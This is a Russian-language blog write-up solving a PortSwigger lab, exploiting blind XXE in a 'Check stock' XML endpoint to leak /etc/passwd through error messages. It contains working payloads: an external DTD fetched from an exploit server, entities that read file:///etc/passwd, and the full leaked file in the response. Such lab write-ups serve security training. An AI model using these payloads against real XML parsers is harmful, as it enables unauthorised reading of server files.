---
title: "Exploiting blind XXE to retrieve data via error messages"
date: 2025-12-25
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages"
classes: wide
---	

В этой лабораторной работе есть функция `Check stock`, которая обрабатывает `XML`-ввод, но не отображает результат. Чтобы решить лабораторную, нужно использовать внешний `DTD`, чтобы спровоцировать сообщение об ошибке, которое покажет содержимое файла `/etc/passwd`. В лабораторной есть ссылка на `exploit` сервер в другом домене, где можно разместить свой вредоносный `DTD`.

```
https://0a0300e70491d4468583dc6f00b500a5.web-security-academy.net/
```

# Solution

Без лишних прелюдий иду к ручке `Check Stock`. Соберу запрос и отправлю его в `Repeater`:

```http
POST /product/stock HTTP/2
Host: 0a0300e70491d4468583dc6f00b500a5.web-security-academy.net
Cookie: session=ulqMxQ3VaPYCE50uucAARdG1hdcVm27y
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0300e70491d4468583dc6f00b500a5.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a0300e70491d4468583dc6f00b500a5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Отлично. Попробую собрать `XXE`-пейлоад:

```xml
<!DOCTYPE payload [ <!ENTITY % xxe SYSTEM "https://exploit-0af0004104bcd4d68571db3701d0005c.exploit-server.net/exploit"> %xxe;]>
```

Добавлю его к запросу:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE payload [ <!ENTITY % xxe SYSTEM "https://exploit-0af0004104bcd4d68571db3701d0005c.exploit-server.net/exploit"> %xxe;]>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

Любопытно. Получил ошибку с сервера:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 179

"XML parser exited with error: org.xml.sax.SAXParseException; systemId: https://exploit-0af0004104bcd4d68571db3701d0005c.exploit-server.net/exploit; lineNumber: 1; columnNumber: 1; The markup declarations contained or pointed to by the document type declaration must be well-formed."
```

Попробую вывести файл `/etc/passwd` через ошибку. Для этого создам сущность, которая берет значение из `/etc/passwd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
```

Далее нужно создать заведомо ошибочный запрос в `XML`. Например, обращение к файлу, которого нет в системе:

```xml
<!ENTITY % test "<!ENTITY &#x25; error_text SYSTEM 'file:///@coffee_cu63/%file;'>">
```

Соберу все вместе:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; error_text SYSTEM 'file:///@coffee_cu63/%file;'>">
%send;
%error_text;
```

Сохраню пейлоад на `exploit` сервере, чтобы использовать его в качестве внешней сущности. Отправлю запрос:


```http
POST /product/stock HTTP/2
Host: 0a0300e70491d4468583dc6f00b500a5.web-security-academy.net
Cookie: session=ulqMxQ3VaPYCE50uucAARdG1hdcVm27y
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0300e70491d4468583dc6f00b500a5.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 252
Origin: https://0a0300e70491d4468583dc6f00b500a5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE payload [ <!ENTITY % xxe SYSTEM "https://exploit-0af0004104bcd4d68571db3701d0005c.exploit-server.net/exploit"> %xxe;]>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

Ответ выглядит вот так:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2420

"XML parser exited with error: java.io.FileNotFoundException: /@coffee_cu63/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"
```

Лаба решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-data-retrieval-via-error-messages/1.png){: height="200" .align-center}
